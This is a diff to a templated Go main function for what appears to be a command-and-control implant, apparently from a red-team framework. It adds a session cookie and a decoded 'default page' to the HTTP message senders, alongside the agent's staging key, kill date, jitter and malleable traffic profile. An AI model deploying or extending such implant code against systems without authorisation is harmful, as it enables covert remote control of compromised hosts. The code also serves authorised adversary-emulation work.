@@ -105,6 +105,7 @@ func main() {
 	lostLimit := {{ LOST_LIMIT }}
     stagingKeyBase64 := "{{ STAGING_KEY }}"
 	defaultResponse := "{{ DEFAULT_RESPONSE }}"
+	sessionCookie := "{{ SESSION_COOKIE }}"
 	agent_private_cert_key_encoded := "{{ AGENT_PRIVATE_CERT_KEY }}"
 	agent_public_cert_key_encoded := "{{ AGENT_PUBLIC_CERT_KEY }}"
 	server_public_cert_key_encoded := "{{ SERVER_PUBLIC_CERT_KEY }}"
@@ -157,11 +158,18 @@ func main() {
 	}
 
 	packetHandler := comms.PacketHandler{
-		MissedCheckins: 0,
-		Server:         server,
-		StagingKey:     stagingKey,
-		SessionID:      sessionID,
-		Aeskey:         sessionKey,
+		Server:     server,
+		StagingKey: stagingKey,
+		SessionID:  sessionID,
+		Aeskey:     sessionKey,
+	}
+
+	// The listener's default page: what it serves for an idle poll, accepted
+	// results and a rejected packet on the legacy path.
+	defaultPage, err := base64.StdEncoding.DecodeString(defaultResponse)
+	if err != nil {
+		fmt.Println("Error decoding default response:", err)
+		return
 	}
 
 	nonceStr := string(nonce)
@@ -179,16 +187,16 @@ func main() {
 	postURL := server + stage2URI
 	_, _ = http.Post(postURL, "application/octet-stream", bytes.NewReader(routingPacket))
 {% if MALLEABLE %}
-	messagesender, err := comms.NewMalleableHttpMessageSender(server, make(map[string]string), profile, malleableProfileB64)
+	messagesender, err := comms.NewMalleableHttpMessageSender(server, make(map[string]string), profile, malleableProfileB64, sessionCookie, defaultPage)
 	if err != nil {
 		fmt.Println("Error building message sender:", err)
 		return
 	}
 {% else %}
-	messagesender := comms.NewHttpMessageSender(server, make(map[string]string), profile)
+	messagesender := comms.NewHttpMessageSender(server, make(map[string]string), profile, sessionCookie, defaultPage)
 {% endif %}
 
-	newAgent := agent.NewMainAgent(packetHandler, messagesender, sessionID, killDate, workingHours, delay, jitter, lostLimit, sessionKey, defaultResponse)
+	newAgent := agent.NewMainAgent(packetHandler, messagesender, sessionID, killDate, workingHours, delay, jitter, lostLimit, sessionKey)
 
 	go newAgent.Run()
 
